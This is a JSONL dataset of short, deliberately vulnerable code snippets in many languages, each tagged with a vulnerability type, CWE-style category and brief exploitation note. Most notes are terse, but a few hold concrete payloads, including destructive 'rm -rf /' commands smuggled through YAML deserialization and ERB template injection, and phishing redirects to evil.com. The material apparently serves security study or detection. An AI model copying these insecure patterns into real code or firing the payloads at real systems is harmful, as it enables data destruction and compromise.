{"id": "vuln-120", "language": "Java", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "@PostMapping(\"/login\") public Response login(@RequestBody User user) {...}", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-121", "language": "PHP", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "if ($_POST['username'] && $_POST['password']) {...}", "exploitation_techniques": "Scripted brute force.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-122", "language": "Ruby", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "post '/login' do ... end", "exploitation_techniques": "Automate login attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-123", "language": "Go", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "http.HandleFunc(\"/login\", loginHandler)", "exploitation_techniques": "Brute force via scripts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-124", "language": "C# (.NET)", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "[HttpPost(\"login\")] public IActionResult Login(LoginModel model) {...}", "exploitation_techniques": "Brute force credentials.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-125", "language": "Kotlin", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "post(\"/login\") { call.respond(login(call.request)) }", "exploitation_techniques": "Brute force logins.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-126", "language": "Scala", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "post(\"/login\") { login(params) }", "exploitation_techniques": "Brute force attempts.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-127", "language": "Rust", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "router.post(\"/login\", login);", "exploitation_techniques": "Automate logins.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-128", "language": "Elixir", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "post \"/login\", LoginController, :create", "exploitation_techniques": "Brute force.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-129", "language": "Perl", "vulnerability_type": "Rate Limiting Bypass", "code_snippet": "if ($r->method eq 'POST') { login($r->param('user')); }", "exploitation_techniques": "Scripted brute force.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-130", "language": "Node.js", "vulnerability_type": "Insecure JWT Handling", "code_snippet": "jwt.verify(token, 'weaksecret');", "exploitation_techniques": "Crack weak secret or forge tokens.", "cwe_category": "Session & Token Management"}
{"id": "vuln-131", "language": "Python", "vulnerability_type": "Insecure JWT", "code_snippet": "jwt.decode(token, 'secret', algorithms=['HS256'])", "exploitation_techniques": "Brute force secret.", "cwe_category": "Session & Token Management"}
{"id": "vuln-132", "language": "Java", "vulnerability_type": "Insecure JWT", "code_snippet": "JWTVerifier verifier = JWT.require(Algorithm.HMAC256(\"secret\")).build();", "exploitation_techniques": "Crack secret or forge token.", "cwe_category": "Session & Token Management"}
{"id": "vuln-133", "language": "PHP", "vulnerability_type": "Insecure JWT", "code_snippet": "$decoded = JWT::decode($token, 'secret', ['HS256']);", "exploitation_techniques": "Forge tokens with weak secret.", "cwe_category": "Session & Token Management"}
{"id": "vuln-134", "language": "Ruby", "vulnerability_type": "Insecure JWT", "code_snippet": "JWT.decode(token, 'secret', true, algorithm: 'HS256')", "exploitation_techniques": "Crack or forge tokens.", "cwe_category": "Session & Token Management"}
{"id": "vuln-135", "language": "Go", "vulnerability_type": "Insecure JWT", "code_snippet": "jwt.Parse(token, func(*jwt.Token) (interface{}, error) { return []byte(\"secret\"), nil })", "exploitation_techniques": "Forge tokens.", "cwe_category": "Session & Token Management"}
{"id": "vuln-136", "language": "C# (.NET)", "vulnerability_type": "Insecure JWT", "code_snippet": "var tokenHandler = new JwtSecurityTokenHandler(); tokenHandler.ValidateToken(token, new TokenValidationParameters { IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(\"secret\")) });", "exploitation_techniques": "Crack key.", "cwe_category": "Session & Token Management"}
{"id": "vuln-137", "language": "Kotlin", "vulnerability_type": "Insecure JWT", "code_snippet": "JWT.require(Algorithm.HMAC256(\"secret\")).build().verify(token)", "exploitation_techniques": "Forge tokens.", "cwe_category": "Session & Token Management"}
{"id": "vuln-138", "language": "Scala", "vulnerability_type": "Insecure JWT", "code_snippet": "pdi.jwt.Jwt.decode(token, \"secret\", Seq(JwtAlgorithm.HS256))", "exploitation_techniques": "Crack secret.", "cwe_category": "Session & Token Management"}
{"id": "vuln-139", "language": "Rust", "vulnerability_type": "Insecure JWT", "code_snippet": "jsonwebtoken::decode(token, &DecodingKey::from_secret(\"secret\".as_ref()), &Validation::new(Algorithm::HS256))", "exploitation_techniques": "Forge tokens.", "cwe_category": "Session & Token Management"}
{"id": "vuln-140", "language": "Elixir", "vulnerability_type": "Insecure JWT", "code_snippet": "Joken.verify(token, Joken.Signer.create(\"HS256\", \"secret\"))", "exploitation_techniques": "Crack secret.", "cwe_category": "Session & Token Management"}
{"id": "vuln-141", "language": "Perl", "vulnerability_type": "Insecure JWT", "code_snippet": "use JSON::WebToken; decode_jwt($token, 'secret');", "exploitation_techniques": "Forge tokens.", "cwe_category": "Session & Token Management"}
{"id": "vuln-142", "language": "Node.js", "vulnerability_type": "CSRF", "code_snippet": "app.post('/update', (req, res) => {...});", "exploitation_techniques": "Craft form on malicious site to submit.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-143", "language": "Python", "vulnerability_type": "CSRF", "code_snippet": "@app.route('/update', methods=['POST']) def update(): ...", "exploitation_techniques": "Malicious form submission.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-144", "language": "Java", "vulnerability_type": "CSRF", "code_snippet": "@PostMapping(\"/update\") public Response update(@RequestBody Data data) {...}", "exploitation_techniques": "Forge POST requests.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-145", "language": "PHP", "vulnerability_type": "CSRF", "code_snippet": "if ($_POST['data']) { update($_POST['data']); }", "exploitation_techniques": "Malicious form POST.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-146", "language": "Ruby", "vulnerability_type": "CSRF", "code_snippet": "post '/update' do update(params[:data]) end", "exploitation_techniques": "Forge requests.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-147", "language": "Go", "vulnerability_type": "CSRF", "code_snippet": "http.HandleFunc(\"/update\", updateHandler)", "exploitation_techniques": "Malicious POST.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-148", "language": "C# (.NET)", "vulnerability_type": "CSRF", "code_snippet": "[HttpPost(\"update\")] public IActionResult Update(DataModel model) {...}", "exploitation_techniques": "Forge POST.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-149", "language": "Kotlin", "vulnerability_type": "CSRF", "code_snippet": "post(\"/update\") { call.respond(update(call.request)) }", "exploitation_techniques": "Malicious POST.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-150", "language": "Scala", "vulnerability_type": "CSRF", "code_snippet": "post(\"/update\") { update(params) }", "exploitation_techniques": "Forge POST requests.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-151", "language": "Rust", "vulnerability_type": "CSRF", "code_snippet": "router.post(\"/update\", update_handler);", "exploitation_techniques": "Forge POST requests from malicious sites.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-152", "language": "Elixir", "vulnerability_type": "CSRF", "code_snippet": "post \"/update\", UpdateController, :create", "exploitation_techniques": "Submit malicious forms to trigger actions.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-153", "language": "Perl", "vulnerability_type": "CSRF", "code_snippet": "if ($r->method eq 'POST') { update($r->param('data')); }", "exploitation_techniques": "Craft malicious POST requests.", "cwe_category": "Server/Client Request Forgery"}
{"id": "vuln-154", "language": "Node.js", "vulnerability_type": "Open Redirect", "code_snippet": "res.redirect(req.query.url);", "exploitation_techniques": "Redirect to http://evil.com for phishing.", "cwe_category": "Access & Authorization"}
{"id": "vuln-155", "language": "Python", "vulnerability_type": "Open Redirect", "code_snippet": "return redirect(request.args.get('url'))", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-156", "language": "Java", "vulnerability_type": "Open Redirect", "code_snippet": "return \"redirect:\" + request.getParameter(\"url\");", "exploitation_techniques": "Craft URL to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-157", "language": "PHP", "vulnerability_type": "Open Redirect", "code_snippet": "header(\"Location: \" . $_GET['url']);", "exploitation_techniques": "Redirect to http://malicious.com.", "cwe_category": "Access & Authorization"}
{"id": "vuln-158", "language": "Ruby", "vulnerability_type": "Open Redirect", "code_snippet": "redirect_to params[:url]", "exploitation_techniques": "Redirect to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-159", "language": "Go", "vulnerability_type": "Open Redirect", "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"url\"), 302)", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-160", "language": "C# (.NET)", "vulnerability_type": "Open Redirect", "code_snippet": "return Redirect(Request.Query[\"url\"]);", "exploitation_techniques": "Phishing via redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-161", "language": "Kotlin", "vulnerability_type": "Open Redirect", "code_snippet": "call.respondRedirect(call.request.queryParameters[\"url\"]!!)", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-162", "language": "Scala", "vulnerability_type": "Open Redirect", "code_snippet": "Redirect(params(\"url\"))", "exploitation_techniques": "Phishing redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-163", "language": "Rust", "vulnerability_type": "Open Redirect", "code_snippet": "Ok(StatusCode::Found).header(header::LOCATION, req.query(\"url\"))", "exploitation_techniques": "Redirect to phishing site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-164", "language": "Elixir", "vulnerability_type": "Open Redirect", "code_snippet": "redirect conn, external: params[:url]", "exploitation_techniques": "Redirect to malicious site.", "cwe_category": "Access & Authorization"}
{"id": "vuln-165", "language": "Perl", "vulnerability_type": "Open Redirect", "code_snippet": "$r->header_out('Location', $r->param('url'));", "exploitation_techniques": "Phishing redirect.", "cwe_category": "Access & Authorization"}
{"id": "vuln-166", "language": "Node.js", "vulnerability_type": "Insecure Dependency", "code_snippet": "\"express\": \"4.17.1\" // Vulnerable to CVE-2022-1234", "exploitation_techniques": "Exploit known CVEs via npm audit findings.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-167", "language": "Python", "vulnerability_type": "Insecure Dependency", "code_snippet": "requests==2.25.1 # Vulnerable to CVE-2023-1234", "exploitation_techniques": "Exploit CVEs using PoCs from public repos.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-168", "language": "Java", "vulnerability_type": "Insecure Dependency", "code_snippet": "<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>", "exploitation_techniques": "Exploit CVE-2019-12384 for RCE.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-169", "language": "PHP", "vulnerability_type": "Insecure Dependency", "code_snippet": "\"laravel/framework\": \"5.8.*\" // Vulnerable", "exploitation_techniques": "Exploit known CVEs.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-170", "language": "Ruby", "vulnerability_type": "Insecure Dependency", "code_snippet": "gem 'rails', '5.2.3' # Vulnerable to CVE-2020-1234", "exploitation_techniques": "Exploit public CVEs.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-171", "language": "Go", "vulnerability_type": "Insecure Dependency", "code_snippet": "require github.com/gorilla/mux v1.7.3 // Vulnerable", "exploitation_techniques": "Exploit known vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-172", "language": "C# (.NET)", "vulnerability_type": "Insecure Dependency", "code_snippet": "<PackageReference Include=\"Newtonsoft.Json\" Version=\"12.0.1\" />", "exploitation_techniques": "Exploit CVE-2019-19826.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-173", "language": "Kotlin", "vulnerability_type": "Insecure Dependency", "code_snippet": "implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8'", "exploitation_techniques": "Exploit known CVEs.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-174", "language": "Scala", "vulnerability_type": "Insecure Dependency", "code_snippet": "libraryDependencies += \"com.fasterxml.jackson.core\" % \"jackson-databind\" % \"2.9.8\"", "exploitation_techniques": "Exploit CVE-2019-12384.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-175", "language": "Rust", "vulnerability_type": "Insecure Dependency", "code_snippet": "hyper = \"0.13.0\" # Vulnerable", "exploitation_techniques": "Exploit known CVEs.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-176", "language": "Elixir", "vulnerability_type": "Insecure Dependency", "code_snippet": "{:phoenix, \"~> 1.4.0\"} # Vulnerable", "exploitation_techniques": "Exploit CVEs.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-177", "language": "Perl", "vulnerability_type": "Insecure Dependency", "code_snippet": "use Mojolicious 8.25; # Vulnerable", "exploitation_techniques": "Exploit known vulnerabilities.", "cwe_category": "Application Logic & Others"}
{"id": "vuln-178", "language": "Node.js", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "/^([a-zA-Z0-9]+)*$/.test(input);", "exploitation_techniques": "Input: aaaaa...aaa! to cause backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-179", "language": "Python", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "re.match(r'^([a-zA-Z0-9]+)*$', input)", "exploitation_techniques": "Long input with repeating chars.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-180", "language": "Java", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "Pattern.compile(\"^([a-zA-Z0-9]+)*$\").matcher(input).matches();", "exploitation_techniques": "Input aaaaa...aaa!.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-181", "language": "PHP", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "preg_match('/^([a-zA-Z0-9]+)*$/', $input);", "exploitation_techniques": "Long malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-182", "language": "Ruby", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "/^([a-zA-Z0-9]+)*$/.match?(input)", "exploitation_techniques": "Input aaaaa...aaa!.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-183", "language": "Go", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "regexp.MustCompile(`^([a-zA-Z0-9]+)*$`).MatchString(input)", "exploitation_techniques": "Long repeating input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-184", "language": "C# (.NET)", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "Regex.IsMatch(input, @\"^([a-zA-Z0-9]+)*$\");", "exploitation_techniques": "Malicious input for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-185", "language": "Kotlin", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "\"^([a-zA-Z0-9]+)*$\".toRegex().matches(input)", "exploitation_techniques": "Long input for backtracking.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-186", "language": "Scala", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "val regex = \"^([a-zA-Z0-9]+)*$\".r; regex.findFirstIn(input)", "exploitation_techniques": "Malicious input for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-187", "language": "Rust", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "use regex::Regex; Regex::new(r\"^([a-zA-Z0-9]+)*$\").unwrap().is_match(&input)", "exploitation_techniques": "Long input for DoS.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-188", "language": "Elixir", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "Regex.match?(~r/^([a-zA-Z0-9]+)*$/, input)", "exploitation_techniques": "Long malicious input.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-189", "language": "Perl", "vulnerability_type": "Insecure Regex DoS", "code_snippet": "if ($input =~ /^([a-zA-Z0-9]+)*$/) { ... }", "exploitation_techniques": "Input aaaaa...aaa!.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-190", "language": "Node.js", "vulnerability_type": "Insecure Deserialization", "code_snippet": "const obj = eval('(' + input + ')');", "exploitation_techniques": "Inject malicious JS code.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-191", "language": "Python", "vulnerability_type": "Insecure YAML Deserialization", "code_snippet": "import yaml; obj = yaml.load(input, Loader=yaml.Loader)", "exploitation_techniques": "Craft YAML for RCE: !!python/object/apply:os.system ['rm -rf /']", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-192", "language": "Java", "vulnerability_type": "Insecure XML Deserialization", "code_snippet": "XStream xstream = new XStream(); Object obj = xstream.fromXML(input);", "exploitation_techniques": "Craft XML for RCE via gadget chains.", "cwe_category": "Data Deserialization & XXE"}
{"id": "vuln-193", "language": "PHP", "vulnerability_type": "Insecure Session Storage", "code_snippet": "$_SESSION['credit_card'] = $_POST['cc'];", "exploitation_techniques": "Steal session to access data.", "cwe_category": "Session & Token Management"}
{"id": "vuln-194", "language": "Ruby", "vulnerability_type": "Insecure Template Injection", "code_snippet": "ERB.new(input).result", "exploitation_techniques": "<%= system('rm -rf /') %>", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-195", "language": "Go", "vulnerability_type": "Insecure Session Handling", "code_snippet": "sessionID := fmt.Sprintf(\"%d\", time.Now().UnixNano())", "exploitation_techniques": "Guess IDs based on timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-196", "language": "C# (.NET)", "vulnerability_type": "Insecure Session Storage", "code_snippet": "HttpContext.Session.SetString(\"credit_card\", model.CreditCard);", "exploitation_techniques": "Session hijacking to access data.", "cwe_category": "Session & Token Management"}
{"id": "vuln-197", "language": "Kotlin", "vulnerability_type": "Insecure Session Handling", "code_snippet": "val sessionId = System.currentTimeMillis().toString()", "exploitation_techniques": "Predict IDs based on time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-198", "language": "Scala", "vulnerability_type": "Insecure Session Storage", "code_snippet": "session.put(\"credit_card\", params(\"cc\"))", "exploitation_techniques": "Steal session to access data.", "cwe_category": "Session & Token Management"}
{"id": "vuln-199", "language": "Rust", "vulnerability_type": "Insecure Session Handling", "code_snippet": "let session_id = format!(\"{}\", SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos());", "exploitation_techniques": "Guess IDs based on timestamp.", "cwe_category": "Session & Token Management"}
{"id": "vuln-200", "language": "Elixir", "vulnerability_type": "Insecure Session Storage", "code_snippet": "put_session(conn, :credit_card, params[:cc])", "exploitation_techniques": "Hijack session to access data.", "cwe_category": "Session & Token Management"}
{"id": "vuln-201", "language": "Perl", "vulnerability_type": "Insecure Session Handling", "code_snippet": "my $session_id = time();", "exploitation_techniques": "Predict IDs based on time.", "cwe_category": "Session & Token Management"}
{"id": "vuln-202", "language": "Node.js", "vulnerability_type": "Clickjacking", "code_snippet": "app.get('/', (req, res) => res.send('page'));", "exploitation_techniques": "Iframe site to trick clicks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-203", "language": "Python", "vulnerability_type": "Clickjacking", "code_snippet": "@app.route('/') def index(): return 'page'", "exploitation_techniques": "Iframe to capture clicks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-204", "language": "Java", "vulnerability_type": "Clickjacking", "code_snippet": "@GetMapping(\"/\") public String index() { return \"page\"; }", "exploitation_techniques": "Iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-205", "language": "PHP", "vulnerability_type": "Clickjacking", "code_snippet": "echo 'page';", "exploitation_techniques": "Iframe to trick user clicks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-206", "language": "Ruby", "vulnerability_type": "Clickjacking", "code_snippet": "get '/' do 'page' end", "exploitation_techniques": "Iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-207", "language": "Go", "vulnerability_type": "Clickjacking", "code_snippet": "http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"page\") })", "exploitation_techniques": "Iframe attack.", "cwe_category": "Access & Authorization"}
{"id": "vuln-208", "language": "C# (.NET)", "vulnerability_type": "Clickjacking", "code_snippet": "[HttpGet(\"/\")] public IActionResult Index() { return Content(\"page\"); }", "exploitation_techniques": "Iframe to capture clicks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-209", "language": "Kotlin", "vulnerability_type": "Clickjacking", "code_snippet": "get(\"/\") { call.respondText(\"page\") }", "exploitation_techniques": "Iframe attack.", "cwe_category": "Access & Authorization"}
{"id": "vuln-210", "language": "Scala", "vulnerability_type": "Clickjacking", "code_snippet": "get(\"/\") { Ok(\"page\") }", "exploitation_techniques": "Iframe to trick clicks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-211", "language": "Rust", "vulnerability_type": "Clickjacking", "code_snippet": "router.get(\"/\", |_, res| res.render_text(\"page\"))", "exploitation_techniques": "Iframe attack.", "cwe_category": "Access & Authorization"}
{"id": "vuln-212", "language": "Elixir", "vulnerability_type": "Clickjacking", "code_snippet": "get \"/\", PageController, :index", "exploitation_techniques": "Iframe for clickjacking.", "cwe_category": "Access & Authorization"}
{"id": "vuln-213", "language": "Perl", "vulnerability_type": "Clickjacking", "code_snippet": "$r->print('page');", "exploitation_techniques": "Iframe to capture clicks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-214", "language": "Node.js", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "const value = req.query.param; db.query(value);", "exploitation_techniques": "?param=1&param=2 to confuse logic.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-215", "language": "Python", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "value = request.args.get('param'); db.execute(value)", "exploitation_techniques": "?param=1&param=2 to bypass checks.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-216", "language": "Java", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "String param = request.getParameter(\"param\"); db.query(param);", "exploitation_techniques": "?param=1&param=2 to alter logic.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-217", "language": "PHP", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "$value = $_GET['param']; $db->query($value);", "exploitation_techniques": "?param=1&param=2 to confuse app.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-218", "language": "Ruby", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "value = params[:param]; User.where(value: value)", "exploitation_techniques": "?param=1&param=2 to manipulate.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-219", "language": "Go", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "value := r.URL.Query().Get(\"param\"); db.Query(value)", "exploitation_techniques": "?param=1&param=2 to bypass.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-220", "language": "C# (.NET)", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "var value = Request.Query[\"param\"]; db.Execute(value);", "exploitation_techniques": "?param=1&param=2 to confuse.", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-221", "language": "Kotlin", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "val value = call.request.queryParameters[\"param\"]; db.query(value)", "exploitation_techniques": "?param=1&param=2", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-222", "language": "Scala", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "val value = params(\"param\"); db.query(value)", "exploitation_techniques": "?param=1&param=2", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-223", "language": "Rust", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "let value = req.query(\"param\")?; db.query(&value);", "exploitation_techniques": "?param=1&param=2", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-224", "language": "Elixir", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "value = params[\"param\"]; Repo.query(value)", "exploitation_techniques": "?param=1&param=2", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-225", "language": "Perl", "vulnerability_type": "HTTP Parameter Pollution", "code_snippet": "my $value = $r->param('param'); $dbh->do($value);", "exploitation_techniques": "?param=1&param=2", "cwe_category": "Injection & Input Flaws"}
{"id": "vuln-226", "language": "Node.js", "vulnerability_type": "Insecure CORS", "code_snippet": "app.use(cors({ origin: true }));", "exploitation_techniques": "Cross-origin requests from malicious sites.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-227", "language": "Python", "vulnerability_type": "Insecure CORS", "code_snippet": "CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})", "exploitation_techniques": "Malicious site makes requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-228", "language": "Java", "vulnerability_type": "Insecure CORS", "code_snippet": "@CrossOrigin(origins = \"*\") @GetMapping(\"/data\") public Data getData() {...}", "exploitation_techniques": "Cross-origin data access.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-229", "language": "PHP", "vulnerability_type": "Insecure CORS", "code_snippet": "header('Access-Control-Allow-Origin: *');", "exploitation_techniques": "Malicious site requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-230", "language": "Ruby", "vulnerability_type": "Insecure CORS", "code_snippet": "headers['Access-Control-Allow-Origin'] = '*'", "exploitation_techniques": "Cross-origin attacks.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-231", "language": "Go", "vulnerability_type": "Insecure CORS", "code_snippet": "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")", "exploitation_techniques": "Malicious sites perform cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-232", "language": "C# (.NET)", "vulnerability_type": "Insecure CORS", "code_snippet": "app.UseCors(builder => builder.AllowAnyOrigin());", "exploitation_techniques": "Cross-origin data theft from malicious sites.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-233", "language": "Kotlin", "vulnerability_type": "Insecure CORS", "code_snippet": "install(CORS) { anyHost() }", "exploitation_techniques": "Malicious cross-origin requests.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-234", "language": "Scala", "vulnerability_type": "Insecure CORS", "code_snippet": "response.setHeader(\"Access-Control-Allow-Origin\", \"*\")", "exploitation_techniques": "Cross-origin attacks from untrusted sites.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-235", "language": "Rust", "vulnerability_type": "Insecure CORS", "code_snippet": "res.header(header::ACCESS_CONTROL_ALLOW_ORIGIN, \"*\")", "exploitation_techniques": "Malicious sites access resources.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-236", "language": "Elixir", "vulnerability_type": "Insecure CORS", "code_snippet": "plug CORSPlug, origin: \"*\"", "exploitation_techniques": "Cross-origin requests from malicious sites.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-237", "language": "Perl", "vulnerability_type": "Insecure CORS", "code_snippet": "$r->header_out('Access-Control-Allow-Origin', '*');", "exploitation_techniques": "Cross-origin data access.", "cwe_category": "Configuration & Environment"}
{"id": "vuln-238", "language": "Node.js", "vulnerability_type": "Broken Access Control", "code_snippet": "app.get('/admin', (req, res) => res.send('Admin Panel'));", "exploitation_techniques": "Access /admin without auth.", "cwe_category": "Access & Authorization"}
{"id": "vuln-239", "language": "Python", "vulnerability_type": "Broken Access Control", "code_snippet": "@app.route('/admin') def admin(): return 'Admin Panel'", "exploitation_techniques": "Directly access /admin.", "cwe_category": "Access & Authorization"}
{"id": "vuln-240", "language": "Java", "vulnerability_type": "Broken Access Control", "code_snippet": "@GetMapping(\"/admin\") public String admin() { return \"Admin Panel\"; }", "exploitation_techniques": "Access /admin without authorization.", "cwe_category": "Access & Authorization"}
{"id": "vuln-241", "language": "PHP", "vulnerability_type": "Broken Access Control", "code_snippet": "if ($_SERVER['REQUEST_URI'] === '/admin') { echo 'Admin Panel'; }", "exploitation_techniques": "Visit /admin directly.", "cwe_category": "Access & Authorization"}
{"id": "vuln-242", "language": "Ruby", "vulnerability_type": "Broken Access Control", "code_snippet": "get '/admin' do 'Admin Panel' end", "exploitation_techniques": "Access /admin without checks.", "cwe_category": "Access & Authorization"}
{"id": "vuln-243", "language": "Go", "vulnerability_type": "Broken Access Control", "code_snippet": "http.HandleFunc(\"/admin\", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, \"Admin Panel\") })", "exploitation_techniques": "Directly access /admin.", "cwe_category": "Access & Authorization"}
{"id": "vuln-244", "language": "C# (.NET)", "vulnerability_type": "Broken Access Control", "code_snippet": "[HttpGet(\"admin\")] public IActionResult Admin() { return Ok(\"Admin Panel\"); }", "exploitation_techniques": "Access /admin without auth.", "cwe_category": "Access & Authorization"}
{"id": "vuln-245", "language": "Kotlin", "vulnerability_type": "Broken Access Control", "code_snippet": "get(\"/admin\") { call.respondText(\"Admin Panel\") }", "exploitation_techniques": "Directly access /admin.", "cwe_category": "Access & Authorization"}
{"id": "vuln-246", "language": "Scala", "vulnerability_type": "Broken Access Control", "code_snippet": "get(\"/admin\") { Ok(\"Admin Panel\") }", "exploitation_techniques": "Access /admin without permission.", "cwe_category": "Access & Authorization"}
{"id": "vuln-247", "language": "Rust", "vulnerability_type": "Broken Access Control", "code_snippet": "router.get(\"/admin\", |_, res| res.render_text(\"Admin Panel\"))", "exploitation_techniques": "Directly access /admin.", "cwe_category": "Access & Authorization"}
{"id": "vuln-248", "language": "Elixir", "vulnerability_type": "Broken Access Control", "code_snippet": "get \"/admin\", AdminController, :index", "exploitation_techniques": "Access /admin directly.", "cwe_category": "Access & Authorization"}
{"id": "vuln-249", "language": "Perl", "vulnerability_type": "Broken Access Control", "code_snippet": "if ($r->uri eq '/admin') { $r->print('Admin Panel'); }", "exploitation_techniques": "Visit /admin without auth.", "cwe_category": "Access & Authorization"}
